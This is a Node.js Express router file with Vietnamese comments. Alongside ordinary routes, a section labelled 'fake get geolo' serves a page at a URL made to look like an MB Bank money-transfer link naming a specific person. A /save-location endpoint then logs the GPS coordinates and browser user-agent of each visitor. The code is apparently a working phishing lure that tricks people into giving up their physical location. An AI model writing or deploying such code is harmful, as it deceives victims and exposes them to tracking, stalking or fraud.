const express = require("express");
const router = express.Router();
const route = require("./useRoute.js");
const getAnswer = require("../controller/getAswerJson.js");

router.use("/getAnswer", async (req, res) => {
    try {
        const query = req.query;

        // Gọi hàm bất đồng bộ
        const answer = await getAnswer(query.name);

        if (answer) {
            console.log(answer, "======");
            res.json(answer);
        } else {
            res.status(404).json({ message: "Not Found" });
        }

        console.log(query.name);
    } catch (error) {
        // Xử lý lỗi
        console.error(error);
        res.status(500).json({ message: "Internal Server Error" });
    }
});



//============================fake get geolo==========================
router.use('/mbbank-nhan-tien-id_mbbank_93903904-hoangvanmanh', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});
router.post('/save-location', (req, res) => {
    const { latitude, longitude } = req.body;
    
    // Lấy thông tin User-Agent
    const userAgent = req.headers['user-agent'];

    // Lấy thời gian hiện tại và format theo "ngày tháng năm giờ phút giây"
    const timestamp = new Date();
    const formattedTime = `${timestamp.getDate()}/${timestamp.getMonth() + 1}/${timestamp.getFullYear()} ${timestamp.getHours()}:${timestamp.getMinutes()}:${timestamp.getSeconds()}`;

    // Log thông tin
    console.log('Thông tin yêu cầu:');
    console.log('Thời gian yêu cầu:', formattedTime);
    console.log('User-Agent:', userAgent);
    console.log('Dữ liệu nhận được:', req.body);
    console.log('Nhận được vị trí:', { latitude, longitude });
    console.log('===========================================');

    // Trả về phản hồi cho client
    res.json({ message: 'Dữ liệu vị trí đã được nhận thành công', latitude, longitude });
});


//=========================================================

router.use("/home", route);
router.use("/about", (req, res) => {
    res.write("<h1>about more</h1>");
    res.end();
})
router.use("/admin", route);

module.exports = router;